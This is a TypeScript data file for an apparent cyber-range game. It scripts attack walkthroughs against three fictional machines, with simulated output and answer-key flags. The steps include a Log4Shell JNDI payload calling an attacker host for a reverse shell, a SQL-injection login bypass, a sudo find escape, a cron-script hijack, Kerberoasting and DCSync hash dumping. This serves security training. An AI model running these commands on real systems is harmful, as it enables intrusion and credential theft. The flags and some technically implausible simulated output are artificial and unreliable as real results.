import { AutopilotStep } from '../../types/ghostops';

export const AUTOPILOT_CHAINS: Record<string, AutopilotStep[]> = {
  'ecorp-hr': [
    {
      id: 'ecorp-step-1',
      stepNumber: 1,
      phase: 'RECON',
      title: 'Target Network Service Discovery',
      description: 'Perform an initial SYN port scan and service version fingerprinting against E-Corp HR.',
      simulatedCommand: 'nmap -sV -sC 10.10.11.45',
      simulatedOutput: `PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu
80/tcp   open  http       Apache/2.4.49 (Log4j / Spring)
8080/tcp open  http-proxy JNDI / LDAP Injection Endpoint`,
      requiresMachineId: 'ecorp-hr',
      explanation: 'Identifies open HTTP port 80 and the vulnerable Log4j audit logging endpoint on 8080.',
    },
    {
      id: 'ecorp-step-2',
      stepNumber: 2,
      phase: 'ENUMERATION',
      title: 'Web Application Route Directory Fuzzing',
      description: 'Discover hidden application directories and sensitive source code files.',
      simulatedCommand: 'gobuster dir -u http://10.10.11.45/ -w common.txt',
      simulatedOutput: `===============================================================
/login                (Status: 200) [Size: 1540]
/admin                (Status: 403) [Size: 420]
/api/audit            (Status: 200) [Size: 180]
/portal               (Status: 200) [Size: 2210]`,
      requiresMachineId: 'ecorp-hr',
      explanation: 'Discovers /api/audit which accepts JSON log submissions and parses user agent headers.',
    },
    {
      id: 'ecorp-step-3',
      stepNumber: 3,
      phase: 'INVESTIGATION',
      title: 'Source Code & Logging Audit',
      description: 'Inspect Java audit logging code to verify Log4j version and vulnerability.',
      simulatedCommand: 'curl http://10.10.11.45/api/audit -H "Content-Type: application/json" -d "{\\"ping\\":\\"test\\"}"',
      simulatedOutput: `{"status":"logged","framework":"Apache Log4j 2.14.1","timestamp":"2026-10-30T14:00:00Z"}`,
      requiresMachineId: 'ecorp-hr',
      explanation: 'Confirms unpatched Apache Log4j 2.14.1 vulnerable to remote code execution (CVE-2021-44228).',
    },
    {
      id: 'ecorp-step-4',
      stepNumber: 4,
      phase: 'EXPLOITATION',
      title: 'Log4Shell JNDI Exploit String Injection',
      description: 'Deliver JNDI LDAP lookup payload via User-Agent HTTP request header.',
      simulatedCommand: 'curl -H "User-Agent: \\${jndi:ldap://10.10.14.22:1389/Exploit}" http://10.10.11.45/api/audit',
      simulatedOutput: `[+] JNDI Lookup Received: ldap://10.10.14.22:1389/Exploit
[+] Staging Java bytecode payload...
[+] Connection established to 10.10.14.22:4444 (alex@ecorp-hr)`,
      requiresMachineId: 'ecorp-hr',
      explanation: 'Triggers initial access reverse shell as developer user alex.',
    },
    {
      id: 'ecorp-step-5',
      stepNumber: 5,
      phase: 'FLAG_CAPTURE',
      title: 'User Flag Extraction',
      description: 'Exfiltrate user flag proof of compromise from user home directory.',
      simulatedCommand: 'cat /home/alex/user.txt',
      simulatedOutput: 'ROOTRANGE{u53r_l0g4j_f00th0ld_pwn3d}',
      requiresMachineId: 'ecorp-hr',
      expectedFlag: 'ROOTRANGE{u53r_l0g4j_f00th0ld_pwn3d}',
      explanation: 'User flag captured (+20 PTS).',
    },
    {
      id: 'ecorp-step-6',
      stepNumber: 6,
      phase: 'PRIVESC',
      title: 'Local Sudo Enumeration & GTFOBins Root Privesc',
      description: 'Inspect sudoers permissions and escape to root shell via /usr/bin/find.',
      simulatedCommand: 'sudo -l && sudo /usr/bin/find . -exec /bin/sh \\; -quit',
      simulatedOutput: `User alex may run the following commands on ecorp-hr:
    (root) NOPASSWD: /usr/bin/find
# id
uid=0(root) gid=0(root) groups=0(root)`,
      requiresMachineId: 'ecorp-hr',
      explanation: 'Escapes find execution sandbox to obtain root UID 0.',
    },
    {
      id: 'ecorp-step-7',
      stepNumber: 7,
      phase: 'FLAG_CAPTURE',
      title: 'Root Flag Capture & Full Compromise',
      description: 'Read the root flag from /root/root.txt and complete machine compromise.',
      simulatedCommand: 'cat /root/root.txt',
      simulatedOutput: 'ROOTRANGE{r00t_pr1v3sc_m4st3r_c0mpr0m1s3}',
      requiresMachineId: 'ecorp-hr',
      expectedFlag: 'ROOTRANGE{r00t_pr1v3sc_m4st3r_c0mpr0m1s3}',
      explanation: 'Machine completely rooted (+30 PTS). Network pivot route to internal subnet unlocked.',
    },
  ],
  'iron-vault': [
    {
      id: 'iron-step-1',
      stepNumber: 1,
      phase: 'RECON',
      title: 'Internal Banking Subnet Discovery',
      description: 'Scan internal API target 10.10.11.82 across ports 22, 8080, and 3306.',
      simulatedCommand: 'nmap -sV 10.10.11.82 -p 22,8080,3306',
      simulatedOutput: `PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian
8080/tcp open  http    Node.js / Express JWT Auth
3306/tcp open  mysql   MySQL 8.0.28`,
      requiresMachineId: 'iron-vault',
      explanation: 'Discovers internal financial API on port 8080.',
    },
    {
      id: 'iron-step-2',
      stepNumber: 2,
      phase: 'EXPLOITATION',
      title: 'SQL Injection Authentication Bypass',
      description: 'Bypass API authentication by injecting SQL tautology into /api/login.',
      simulatedCommand: 'curl -X POST http://10.10.11.82:8080/api/login -H "Content-Type: application/json" -d \'{"username":"admin\\\' OR 1=1--","password":"x"}\'',
      simulatedOutput: `{"success":true,"role":"finance_admin","token":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZmluYW5jZV9hZG1pbiJ9."}`,
      requiresMachineId: 'iron-vault',
      explanation: 'Bypasses SQL verification and receives unsigned JWT token with finance_admin role.',
    },
    {
      id: 'iron-step-3',
      stepNumber: 3,
      phase: 'FLAG_CAPTURE',
      title: 'Vault Ledger Exfiltration & User Flag',
      description: 'Access protected ledger route /api/vault with forged token.',
      simulatedCommand: 'curl http://10.10.11.82:8080/api/vault -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZmluYW5jZV9hZG1pbiJ9."',
      simulatedOutput: `{"vault_id":"VAULT-SEC-9941","user_flag":"ROOTRANGE{u53r_jwt_f0rg3ry_b4nk_l00t}","cron_memo":"/opt/ironbank/scripts/backup.sh runs every 60s as root"}`,
      requiresMachineId: 'iron-vault',
      expectedFlag: 'ROOTRANGE{u53r_jwt_f0rg3ry_b4nk_l00t}',
      explanation: 'User flag claimed (+25 PTS). Cron memo reveals root scheduled task.',
    },
    {
      id: 'iron-step-4',
      stepNumber: 4,
      phase: 'PRIVESC',
      title: 'Scheduled Task Cronjob Hijacking',
      description: 'Inject root execution payload into writable scheduled backup script.',
      simulatedCommand: 'echo "cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt" >> /opt/ironbank/scripts/backup.sh',
      simulatedOutput: `[+] Payload appended to /opt/ironbank/scripts/backup.sh
[+] Waiting 60 seconds for root cron execution...`,
      requiresMachineId: 'iron-vault',
      explanation: 'Writable cron script executes with root privileges on schedule.',
    },
    {
      id: 'iron-step-5',
      stepNumber: 5,
      phase: 'FLAG_CAPTURE',
      title: 'IronBank Root Flag Exfiltration',
      description: 'Extract root flag generated by hijacked cron job.',
      simulatedCommand: 'cat /tmp/root.txt',
      simulatedOutput: 'ROOTRANGE{r00t_cr0n_ov3rwr1t3_pwn4g3}',
      requiresMachineId: 'iron-vault',
      expectedFlag: 'ROOTRANGE{r00t_cr0n_ov3rwr1t3_pwn4g3}',
      explanation: 'IronBank fully rooted (+35 PTS). Route to Active Directory Domain Controller unlocked.',
    },
  ],
  'corp-dc01': [
    {
      id: 'dc-step-1',
      stepNumber: 1,
      phase: 'RECON',
      title: 'Active Directory Infrastructure Audit',
      description: 'Scan Domain Controller 10.10.11.99 for Kerberos, LDAP, and SMB.',
      simulatedCommand: 'nmap -sV -p 53,88,389,445 10.10.11.99',
      simulatedOutput: `PORT    STATE SERVICE      VERSION
88/tcp  open  kerberos-sec Microsoft Windows Kerberos
389/tcp open  ldap         Microsoft Windows Active Directory LDAP
445/tcp open  microsoft-ds Windows Server 2019 SMB`,
      requiresMachineId: 'corp-dc01',
      explanation: 'Confirms Windows Server 2019 Active Directory Domain Controller.',
    },
    {
      id: 'dc-step-2',
      stepNumber: 2,
      phase: 'EXPLOITATION',
      title: 'Kerberoasting TGS Service Ticket Hash Recovery',
      description: 'Query ServicePrincipalNames and extract encrypted Kerberos ticket hash.',
      simulatedCommand: 'GetUserSPNs.py omnicorp.local/ -dc-ip 10.10.11.99 -request',
      simulatedOutput: `[+] ServicePrincipalName: MSSQLSvc/corp-dc01.omnicorp.local:1433
$krb5tgs$23$*sql_svc$omnicorp.local*$98a7f1...`,
      requiresMachineId: 'corp-dc01',
      explanation: 'Extracts crackable Kerberos TGS hash for sql_svc account.',
    },
    {
      id: 'dc-step-3',
      stepNumber: 3,
      phase: 'FLAG_CAPTURE',
      title: 'Offline Hash Cracking & User Flag',
      description: 'Crack recovered TGS hash with rockyou.txt wordlist.',
      simulatedCommand: 'john --wordlist=rockyou.txt tgs_hashes.txt',
      simulatedOutput: `Cracked password: Password123! (sql_svc)
[+] USER FLAG: ROOTRANGE{u53r_k3rb3r04st_t1ck3t_h4sh}`,
      requiresMachineId: 'corp-dc01',
      expectedFlag: 'ROOTRANGE{u53r_k3rb3r04st_t1ck3t_h4sh}',
      explanation: 'Active Directory User flag captured (+30 PTS).',
    },
    {
      id: 'dc-step-4',
      stepNumber: 4,
      phase: 'PRIVESC',
      title: 'DCSync Domain Admin Hash Extraction & Pass-The-Hash',
      description: 'Extract Domain Admin NTLM hash and execute SYSTEM command prompt.',
      simulatedCommand: 'secretsdump.py -just-dc-user Administrator omnicorp.local/sql_svc:Password123!@10.10.11.99',
      simulatedOutput: `Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
[+] Spawning SYSTEM prompt via psexec.py...`,
      requiresMachineId: 'corp-dc01',
      explanation: 'Extracts Domain Admin NTLM hash and connects as NT AUTHORITY\\SYSTEM.',
    },
    {
      id: 'dc-step-5',
      stepNumber: 5,
      phase: 'FLAG_CAPTURE',
      title: 'Domain Admin Root Flag Capture',
      description: 'Read the Domain Controller root flag proof of total domain compromise.',
      simulatedCommand: 'type C:\\Users\\Administrator\\Desktop\\root.txt',
      simulatedOutput: 'ROOTRANGE{r00t_d0m41n_4dm1n_g0d_m0d3}',
      requiresMachineId: 'corp-dc01',
      expectedFlag: 'ROOTRANGE{r00t_d0m41n_4dm1n_g0d_m0d3}',
      explanation: 'Domain Controller fully rooted (+40 PTS). Cyber Range 100% complete.',
    },
  ],
};
